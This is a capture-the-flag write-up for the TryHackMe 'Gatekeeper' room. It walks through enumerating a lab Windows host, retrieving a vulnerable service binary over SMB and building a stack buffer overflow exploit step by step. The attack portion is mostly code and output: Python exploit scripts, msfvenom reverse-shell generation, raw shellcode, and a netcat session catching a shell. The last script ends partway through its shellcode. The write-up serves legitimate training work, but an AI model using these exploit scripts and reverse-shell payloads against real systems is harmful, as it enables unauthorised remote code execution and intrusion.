# Gatekeeper

## Introduction

Welcome to my another writeup! In this TryHackMe [Gatekeeper](https://tryhackme.com/room/gatekeeper) room, you'll learn: Stack buffer overflow, FireFox profile credentials harvesting and more! Without further ado, let's dive in.

## Background

> Can you get past the gate and through the fire?

> Difficulty: Medium

```
Defeat the Gatekeeper to break the chains. But beware, fire awaits on the other side.
```

- Overall difficulty for me: Easy
   - Initial foothold: Easy
   - Privilege escalation: Easy

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# export RHOSTS=10.10.192.183
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT      STATE SERVICE        REASON          VERSION
135/tcp   open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn    syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server? syn-ack ttl 127
|_ssl-date: 2022-10-16T10:43:53+00:00; -5s from scanner time.
| ssl-cert: Subject: commonName=gatekeeper
| Issuer: commonName=gatekeeper
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-10-15T09:22:50
| Not valid after:  2023-04-16T09:22:50
| MD5:   61086bb2363b1f48641e2ef706ac655f
| SHA-1: d37dde5db1f8695b1782178058dc94aebe38fd34
| -----BEGIN CERTIFICATE-----
| MIIC2DCCAcCgAwIBAgIQQnVlVt8Peq1Bq/BdYr7fNjANBgkqhkiG9w0BAQUFADAV
| MRMwEQYDVQQDEwpnYXRla2VlcGVyMB4XDTIyMTAxNTA5MjI1MFoXDTIzMDQxNjA5
| MjI1MFowFTETMBEGA1UEAxMKZ2F0ZWtlZXBlcjCCASIwDQYJKoZIhvcNAQEBBQAD
| ggEPADCCAQoCggEBANBuv9teI8MRyDfiCbrIkni+fbPb8pAY/f6yWHsVS9c9q3zF
| eYa4jY9CibhkXh1FJcIjJfyZPSqBLaUE8FmGNYydNMdXrTuO8c/feGKuh49TPqBD
| d3lJTMZx/R7mS/nTiCLXMTcUF9kTAI/e/ogyzjfVI9Uol/BFL0HZ8AU6VNRzeCyI
| LoXD+aQoym5yqZvm/qhIZWv/z25hLrCHymH8c189cvVQ2dydDkZPwrucI1DlnZ6c
| 5PzMYK6foMtnRvuHjt7xMTVknbEEehSmIWkSd/JEdalKC/osPZ+Z9vjthcc7h5hv
| YnKVAZricskaimod65l7tzniwVKX8JBAXFqTEG0CAwEAAaMkMCIwEwYDVR0lBAww
| CgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IBAQCtqIK/
| z/859fWAboStIxMP3L1QHMJoje+ThNJlfC/XL6AfQJEZTqiZfiDaqAqecwN8JvbO
| Qg35vTRHjDuGtcu+rSL0t1U8qOlQGPDQKkfzBY+2Bvyz2dxygQfFRjM/nVbJ56R6
| +p1+VTwSKaCXmBuDRyYKAvVSCszheIPoC25x4EsuSViwdbQRuDlSeoqmpcHNm6WD
| 7YS9CroFkkrJR0UCDaHyOdL9MkzCTtBF9sHRUBzAYtfHksn7tw+VSPckLoOWCpeV
| 3+kKIgg2SagJjQnZh88vKXqmgy9M6GYlu11QQZVLmwRu+Xfz6RGaCa3us5f8F5fs
| woa45BGFR9ctzueI
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: GATEKEEPER
|   NetBIOS_Domain_Name: GATEKEEPER
|   NetBIOS_Computer_Name: GATEKEEPER
|   DNS_Domain_Name: gatekeeper
|   DNS_Computer_Name: gatekeeper
|   Product_Version: 6.1.7601
|_  System_Time: 2022-10-16T10:43:47+00:00
31337/tcp open  Elite?         syn-ack ttl 127
| fingerprint-strings: 
|   FourOhFourRequest: 
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines: 
|     Hello 
|     Hello
|   GetRequest: 
|     Hello GET / HTTP/1.0
|     Hello
|   HTTPOptions: 
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   Help: 
|     Hello HELP
|   Kerberos: 
|     Hello !!!
|   LDAPSearchReq: 
|     Hello 0
|     Hello
|   LPDString: 
|     Hello 
|     default!!!
|   RTSPRequest: 
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions: 
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm;branch=foo
|     Hello From: <sip:nm@nm>;tag=root
|     Hello To: <sip:nm2@nm2>
|     Hello Call-ID: 50000
|     Hello CSeq: 42 OPTIONS
|     Hello Max-Forwards: 70
|     Hello Content-Length: 0
|     Hello Contact: <sip:nm@nm>
|     Hello Accept: application/sdp
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Hello
49152/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
49163/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
49168/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
[...]
Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: <unknown>, NetBIOS MAC: 02a52b4bc18d (unknown)
| Names:
|   GATEKEEPER<00>       Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   GATEKEEPER<20>       Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   02a52b4bc18d0000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: gatekeeper
|   NetBIOS computer name: GATEKEEPER\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-10-16T06:43:46-04:00
|_clock-skew: mean: 47m54s, deviation: 1h47m20s, median: -5s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 16274/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 54149/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 40274/udp): CLEAN (Timeout)
|   Check 4 (port 31063/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2022-10-16T10:43:46
|_  start_date: 2022-10-16T09:22:17
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

According to `rustscan` result, we have 11 ports are opened:

Open Ports      											  | Service
----------------------------------------|------------------------
135,49152,49153,49154,49155,49163,49168 | Windows RPC
139,445               								  | SMB
3389              											| RDP
31337            											  | Unknown

### SMB on Port 445

**Listing all shares via `smbclient`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# smbclient -L \\\\$RHOSTS
Password for [WORKGROUP\nam]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Users           Disk
```

**The `Users` share is not a default share.**

**`Users` share:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# smbclient \\\\$RHOSTS\\Users
Password for [WORKGROUP\nam]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Thu May 14 21:57:08 2020
  ..                                 DR        0  Thu May 14 21:57:08 2020
  Default                           DHR        0  Tue Jul 14 03:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  Share                               D        0  Thu May 14 21:58:07 2020
  
smb: \> cd Share
smb: \Share\> dir
  .                                   D        0  Thu May 14 21:58:07 2020
  ..                                  D        0  Thu May 14 21:58:07 2020
  gatekeeper.exe                      A    13312  Mon Apr 20 01:27:17 2020
```

**In the `Share` directory, we can see that there is a executable called `gatekeeper.exe`. Let's `get` that file!**
```
smb: \Share\> get gatekeeper.exe
```

**Let's take a look at that exe file!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# file gatekeeper.exe  
gatekeeper.exe: PE32 executable (console) Intel 80386, for MS Windows
```

It's a **32-bit Windows executable**.

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# strings gatekeeper.exe 
!This program cannot be run in DOS mode.
[...]
\\VBOXSVR\dostackbufferoverflowgood\dostackbufferoverflowgood\Release\dostackbufferoverflowgood.pdb
[...]
WSAStartup failed: %d
31337
getaddrinfo failed: %d
socket() failed with error: %ld
bind() failed with error: %d
listen() failed with error: %ld
[+] Listening for connections.
accept failed: %d
Received connection from remote host.
Connection handed off to handler thread.
Please send shorter lines.
Bye!
[!] recvbuf exhausted. Giving up.
Client disconnected.
recv() failed: %d.
Bytes received: %d
exit
Client requested exit.
Hello %s!!!
send failed: %d
Bytes sent: %d
```

**Looks like this executable is listening on port 31337, and we can send something to it!**

### Gatekeeper.exe on Port 31337

**Armed with the above information, let's `nc` into port 31337!**

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# nc -nv $RHOSTS 31337
(UNKNOWN) [10.10.192.183] 31337 (?) open
test
Hello test!!!                                                                                              
```

**In here, when I type something like `test`, it'll repeat: `Hello <our_input>`.**

**What if I type too many stuff that overflow the stack memory?**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# python3 -c "print('A'*100)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!!!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

```

It crashed!

**Now, let's transfer this execuable to our Windows virtual machine for exploiting buffer overflow locally.**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```powershell
PS C:\Users\Student\Desktop> Invoke-WebRequest -Uri http://192.168.183.141/gatekeeper.exe -Outfile gatekeeper.exe
```

## Initial Foothold

To exploit a buffer overflow vulnerability, we have to obtain the executable and finding various of stuff, like EIP offset, bad characters and more.

**To do so, I'll use a debugger called [Immunity Debugger](https://www.immunityinc.com/products/debugger/):**

- First, run the `gatekeeper.exe` executable:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Gatekeeper/images/a1.png)

- Fire up Immunity Debugger **with Administrator privilege:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Gatekeeper/images/a2.png)

- Attach the `gatekeeper.exe` process:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Gatekeeper/images/a3.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Gatekeeper/images/a4.png)

- Once attached, press `F9` to `Run` the programme:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Gatekeeper/images/a5.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Gatekeeper/images/a6.png)

- Next, we need to connect to the debugging machine and send payload:

**To do this, I'll write a simple python script to connect to port 31337 and send our evil buffer.**
```py
#!/usr/bin/env python3

import socket

ip = '192.168.183.144' # Your Windows VM IP
port = 31337 # The gatekeeper.exe listening port

payload = b'your_payload'

try:
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.connect((ip, port))

		print('[+] Sending evil buffer...')
		s.send(payload + b'\r\n') # \r means the Enter key, \n means new line character
		print('[+] Done!')
except:
	print('[-] Unable to send/connect to the target.')
```

When we run this exploit, we'll see:

**Kali:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# python3 exploit.py
[+] Sending evil buffer...
[+] Done!
```

**Windows:**
```
Received connection from remote host.
Connection handed off to handler thread.
Bytes received: 14
Bytes sent: 23
Client disconnected.
```

> Make sure it has the `Bytes sent` output, otherwise it won't trigger the buffer overflow vulnerability.

**We sucessfully connected to the debugging machine to sent 14 bytes, and the process sent us 23 bytes.**

- Then, we now need to find the EIP offset:

**To do so, I'll use mona's `pattern_create` to create a pattern:** (If you don't have mona installed in Immunity Debugger, press [this](https://github.com/corelan/mona) to download mona from their GitHub repository.)

**First, let's configure working folder:**
```
!mona config -set workingfolder c:\mona%p
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Gatekeeper/images/a7.png)

**Then, use `pattern_create` to create pattern:**
```
!mona pattern_create 1000
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Gatekeeper/images/a8.png)

**Copy those pattern and  change the `payload` variable to the generated pattern:**
```py
payload = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7[...]'
```

**Run the exploit again:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# python3 exploit.py
[+] Sending evil buffer...
[+] Done!
```

```
Received connection from remote host.
Connection handed off to handler thread.
Bytes received: 1002
send failed: 10038
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Gatekeeper/images/a9.png)

**We crashed the executable!**

**Next, find the EIP offset:**
```
!mona pattern_offset EIP_VALUE
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Gatekeeper/images/a10.png)

- Found EIP offset: 146

**Let's update our python exploit script for sanity check!**
```py
offset = 146
payload = b'A' * offset + b'B' * 4
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# python3 exploit.py
[+] Sending evil buffer...
[+] Done!
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Gatekeeper/images/a11.png)

**The EIP register has successfully overwritten by 4 B's (42 = B, 41 = A)!**

- Next, We need to find the bad characters:

**To do so, I'll use mona's `bytearray`:**
```
# Generate array of all possible characters except the null byte(\x00):
!mona bytearray -cpb "\x00"
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Gatekeeper/images/a12.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Gatekeeper/images/a13.png)

**Copy and paste those bytes to our python script:**
```py
#!/usr/bin/env python3

import socket

ip = '192.168.183.144' # Your Windows VM IP
port = 31337 # The gatekeeper.exe listening port

offset = 146
payload = b'A' * offset + b'B' * 4
bad_char = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
bad_char += b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
bad_char += b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
bad_char += b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
bad_char += b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
bad_char += b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
bad_char += b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
bad_char += b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

buffer = payload + bad_char

try:
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.connect((ip, port))

		print('[+] Sending evil buffer...')
		s.send(buffer + b'\r\n') # \r means the Enter key, \n means new line character
		print('[+] Done!')
except:
	print('[-] Unable to send/connect to the target.')
```

**Run the exploit:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# python3 exploit.py
[+] Sending evil buffer...
[+] Done!
```

**Use mona's `compare` to find missing bytes:**
```
!mona compare -f C:\monagatekeeper\bytearray.bin -a first_byte_of_the_badchars_array
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Gatekeeper/images/a14.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Gatekeeper/images/a15.png)

- Found bad characters: `\x00` and `\x0a`

**Let's remove `\x0a` byte from our python script:**
```
bad_char = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
```

**Generate a new `bytearrary` with newly found bad character:**
```
!mona bytearray -cpb "\x00\x0a"
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Gatekeeper/images/a16.png)

**Run the python script again:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# python3 exploit.py
[+] Sending evil buffer...
[+] Done!
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Gatekeeper/images/a17.png)

This time we see `unmodified`, which means we found all the bad characters!

- Next, we need to find a return address (JMP ESP):

```
!mona jmp -r esp
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Gatekeeper/images/a18.png)

- Found 2 JMP ESP addresses: `080414C3` and `080416BF`.

I'll use the `080414C3` address.

**Let's add that address to our python script:**
```py
payload = b'A' * offset + b'\xC3\x14\x04\x08'
```

> Note: The address is reversed because of little-endian format.

- Add 32 NOP sleds:

```py
nop = b'\x90' * 32
```

- Generate shellcode via `msfvenom`:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.183.141 LPORT=443 EXITFUNC=thread -f python -v shellcode -b '\x00\x0a'
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1965 bytes
shellcode =  b""
shellcode += b"\xba\x7d\x49\x17\x10\xdb\xd8\xd9\x74\x24\xf4"
shellcode += b"\x58\x29\xc9\xb1\x52\x31\x50\x12\x83\xc0\x04"
shellcode += b"\x03\x2d\x47\xf5\xe5\x31\xbf\x7b\x05\xc9\x40"
shellcode += b"\x1c\x8f\x2c\x71\x1c\xeb\x25\x22\xac\x7f\x6b"
shellcode += b"\xcf\x47\x2d\x9f\x44\x25\xfa\x90\xed\x80\xdc"
shellcode += b"\x9f\xee\xb9\x1d\xbe\x6c\xc0\x71\x60\x4c\x0b"
shellcode += b"\x84\x61\x89\x76\x65\x33\x42\xfc\xd8\xa3\xe7"
shellcode += b"\x48\xe1\x48\xbb\x5d\x61\xad\x0c\x5f\x40\x60"
shellcode += b"\x06\x06\x42\x83\xcb\x32\xcb\x9b\x08\x7e\x85"
shellcode += b"\x10\xfa\xf4\x14\xf0\x32\xf4\xbb\x3d\xfb\x07"
shellcode += b"\xc5\x7a\x3c\xf8\xb0\x72\x3e\x85\xc2\x41\x3c"
shellcode += b"\x51\x46\x51\xe6\x12\xf0\xbd\x16\xf6\x67\x36"
shellcode += b"\x14\xb3\xec\x10\x39\x42\x20\x2b\x45\xcf\xc7"
shellcode += b"\xfb\xcf\x8b\xe3\xdf\x94\x48\x8d\x46\x71\x3e"
shellcode += b"\xb2\x98\xda\x9f\x16\xd3\xf7\xf4\x2a\xbe\x9f"
shellcode += b"\x39\x07\x40\x60\x56\x10\x33\x52\xf9\x8a\xdb"
shellcode += b"\xde\x72\x15\x1c\x20\xa9\xe1\xb2\xdf\x52\x12"
shellcode += b"\x9b\x1b\x06\x42\xb3\x8a\x27\x09\x43\x32\xf2"
shellcode += b"\x9e\x13\x9c\xad\x5e\xc3\x5c\x1e\x37\x09\x53"
shellcode += b"\x41\x27\x32\xb9\xea\xc2\xc9\x2a\xd5\xbb\x66"
shellcode += b"\x27\xbd\xb9\x88\x39\x85\x37\x6e\x53\xe9\x11"
shellcode += b"\x39\xcc\x90\x3b\xb1\x6d\x5c\x96\xbc\xae\xd6"
shellcode += b"\x15\x41\x60\x1f\x53\x51\x15\xef\x2e\x0b\xb0"
shellcode += b"\xf0\x84\x23\x5e\x62\x43\xb3\x29\x9f\xdc\xe4"
shellcode += b"\x7e\x51\x15\x60\x93\xc8\x8f\x96\x6e\x8c\xe8"
shellcode += b"\x12\xb5\x6d\xf6\x9b\x38\xc9\xdc\x8b\x84\xd2"
shellcode += b"\x58\xff\x58\x85\x36\xa9\x1e\x7f\xf9\x03\xc9"
shellcode += b"\x2c\x53\xc3\x8c\x1e\x64\x95\x90\x4a\x12\x79"
shellcode += b"\x20\x23\x63\x86\x8d\xa3\x63\xff\xf3\x53\x8b"
shellcode += b"\x2a\xb0\x74\x6e\xfe\xcd\x1c\x37\x6b\x6c\x41"
shellcode += b"\xc8\x46\xb3\x7c\x4b\x62\x4c\x7b\x53\x07\x49"
shellcode += b"\xc7\xd3\xf4\x23\x58\xb6\xfa\x90\x59\x93"
```

**Copy and paste those shellcodes to our python script:**
```py
#!/usr/bin/env python3

import socket

ip = '192.168.183.144' # Your Windows VM IP
port = 31337 # The gatekeeper.exe listening port

# Bad characters = \x00, \x0a
# JMP ESP = 080414C3
offset = 146
payload = b'A' * offset + b'\xC3\x14\x04\x08'
nop = b'\x90' * 32

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.183.141 LPORT=443 EXITFUNC=thread -f python -v shellcode -b '\x00\x0a'
shellcode =  b""
shellcode += b"\xba\x7d\x49\x17\x10\xdb\xd8\xd9\x74\x24\xf4"
shellcode += b"\x58\x29\xc9\xb1\x52\x31\x50\x12\x83\xc0\x04"
shellcode += b"\x03\x2d\x47\xf5\xe5\x31\xbf\x7b\x05\xc9\x40"
shellcode += b"\x1c\x8f\x2c\x71\x1c\xeb\x25\x22\xac\x7f\x6b"
shellcode += b"\xcf\x47\x2d\x9f\x44\x25\xfa\x90\xed\x80\xdc"
shellcode += b"\x9f\xee\xb9\x1d\xbe\x6c\xc0\x71\x60\x4c\x0b"
shellcode += b"\x84\x61\x89\x76\x65\x33\x42\xfc\xd8\xa3\xe7"
shellcode += b"\x48\xe1\x48\xbb\x5d\x61\xad\x0c\x5f\x40\x60"
shellcode += b"\x06\x06\x42\x83\xcb\x32\xcb\x9b\x08\x7e\x85"
shellcode += b"\x10\xfa\xf4\x14\xf0\x32\xf4\xbb\x3d\xfb\x07"
shellcode += b"\xc5\x7a\x3c\xf8\xb0\x72\x3e\x85\xc2\x41\x3c"
shellcode += b"\x51\x46\x51\xe6\x12\xf0\xbd\x16\xf6\x67\x36"
shellcode += b"\x14\xb3\xec\x10\x39\x42\x20\x2b\x45\xcf\xc7"
shellcode += b"\xfb\xcf\x8b\xe3\xdf\x94\x48\x8d\x46\x71\x3e"
shellcode += b"\xb2\x98\xda\x9f\x16\xd3\xf7\xf4\x2a\xbe\x9f"
shellcode += b"\x39\x07\x40\x60\x56\x10\x33\x52\xf9\x8a\xdb"
shellcode += b"\xde\x72\x15\x1c\x20\xa9\xe1\xb2\xdf\x52\x12"
shellcode += b"\x9b\x1b\x06\x42\xb3\x8a\x27\x09\x43\x32\xf2"
shellcode += b"\x9e\x13\x9c\xad\x5e\xc3\x5c\x1e\x37\x09\x53"
shellcode += b"\x41\x27\x32\xb9\xea\xc2\xc9\x2a\xd5\xbb\x66"
shellcode += b"\x27\xbd\xb9\x88\x39\x85\x37\x6e\x53\xe9\x11"
shellcode += b"\x39\xcc\x90\x3b\xb1\x6d\x5c\x96\xbc\xae\xd6"
shellcode += b"\x15\x41\x60\x1f\x53\x51\x15\xef\x2e\x0b\xb0"
shellcode += b"\xf0\x84\x23\x5e\x62\x43\xb3\x29\x9f\xdc\xe4"
shellcode += b"\x7e\x51\x15\x60\x93\xc8\x8f\x96\x6e\x8c\xe8"
shellcode += b"\x12\xb5\x6d\xf6\x9b\x38\xc9\xdc\x8b\x84\xd2"
shellcode += b"\x58\xff\x58\x85\x36\xa9\x1e\x7f\xf9\x03\xc9"
shellcode += b"\x2c\x53\xc3\x8c\x1e\x64\x95\x90\x4a\x12\x79"
shellcode += b"\x20\x23\x63\x86\x8d\xa3\x63\xff\xf3\x53\x8b"
shellcode += b"\x2a\xb0\x74\x6e\xfe\xcd\x1c\x37\x6b\x6c\x41"
shellcode += b"\xc8\x46\xb3\x7c\x4b\x62\x4c\x7b\x53\x07\x49"
shellcode += b"\xc7\xd3\xf4\x23\x58\xb6\xfa\x90\x59\x93"

buffer = payload + nop + shellcode

try:
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.connect((ip, port))

		print('[+] Sending evil buffer...')
		s.send(buffer + b'\r\n') # \r means the Enter key, \n means new line character
		print('[+] Done!')
except:
	print('[-] Unable to send/connect to the target.')
```

**Now, our exploit has completed! Let's try to get a shell from our debugging virtual machine!**

- Setup a `nc` listener:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# nc -lnvp 443                
listening on [any] 443 ...
```

- Run the exploit:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# python3 exploit.py
[+] Sending evil buffer...
[+] Done!
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# nc -lnvp 443                
listening on [any] 443 ...
connect to [192.168.183.141] from (UNKNOWN) [192.168.183.144] 50460
Microsoft Windows [Version 10.0.19044.2006]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Student\Desktop>whoami && ipconfig
whoami && ipconfig
desktop-n71nbkr\student

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : localdomain
   Link-local IPv6 Address . . . . . : fe80::65d6:b86d:9d3a:c6d7%11
   IPv4 Address. . . . . . . . . . . : 192.168.183.144
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.183.2
```

**We have a shell on our debugging virtual machine!**

- Get a shell on the target machine:

**Change the `LHOST` to `tun0` (VPN IP) in shellcode:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f python -v shellcode -b '\x00\x0a'
```

**Change the `ip` variable to the target IP**
```py
ip = '10.10.192.183' # The target IP
```

**Full exploit script:**
```py
#!/usr/bin/env python3

import socket

ip = '10.10.192.183' # The target IP
port = 31337 # The gatekeeper.exe listening port

# Bad characters = \x00, \x0a
# JMP ESP = 080414C3
offset = 146
payload = b'A' * offset + b'\xC3\x14\x04\x08'
nop = b'\x90' * 32

# msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f python -v shellcode -b '\x00\x0a'
shellcode =  b""
shellcode += b"\xda\xd9\xd9\x74\x24\xf4\x5f\xb8\x8c\xa4\x6e"
shellcode += b"\x15\x31\xc9\xb1\x52\x31\x47\x17\x83\xef\xfc"
shellcode += b"\x03\xcb\xb7\x8c\xe0\x2f\x5f\xd2\x0b\xcf\xa0"
shellcode += b"\xb3\x82\x2a\x91\xf3\xf1\x3f\x82\xc3\x72\x6d"
